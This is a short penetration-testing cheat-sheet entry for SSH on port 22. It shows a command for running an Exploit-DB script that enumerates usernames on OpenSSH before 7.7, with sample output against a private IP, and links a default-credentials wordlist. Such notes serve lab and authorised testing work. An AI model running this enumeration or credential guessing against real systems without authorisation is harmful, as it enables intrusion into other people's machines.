# 22, SSH

## Username enumeration
If the SSH version is OpenSSH < 7.7 you can enumerate users on the machine. 

### Exploit
https://www.exploit-db.com/exploits/45233

### Example command
```
$ python 45233.py --port [port] --username [username] [IP]
```

### Example output
```
$ python 45233.py --port 22 --username root 10.10.10.10
root is a valid user!
$ python 45233.py --port 22 --username james 10.10.10.10
james is not a valid user!
```
  
## Default credentials
There could be accounts on the machine that have default credentials.

### Default credentials list
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
